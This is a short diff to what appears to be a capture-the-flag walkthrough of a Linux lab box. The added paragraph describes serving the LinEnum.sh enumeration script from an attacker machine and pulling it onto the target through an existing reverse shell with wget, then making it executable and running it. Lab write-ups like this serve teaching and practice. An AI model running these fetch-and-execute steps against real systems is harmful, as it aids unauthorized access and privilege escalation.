@@ -119,5 +119,6 @@ Once we've achieved this, we can navigate to `/home/nibbler` and run `cat user.t
 ## Privilege Escalation
 We now have an upgraded reverse shell! Let's try to escalate things. Again, see [[privilege-escalation]] for more detail on how we can do this. 
 
-We'll begin with more enumeration. We'll need to find something to exploit to find escalate our privileges! 
+We'll begin with more enumeration. We'll need to find something to exploit to find escalate our privileges! To do this, we'll use [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh). We begin on our attacker machine by downloading this script, then starting a `python` server with `sudo python3 -m http.server 8080`. Then, from our remote shell, we can download the file with `wget http://[our-ip]/LinEnum.sh`. Make the script executable with `chmod +x LinEnum.sh` and then run it.
+
 
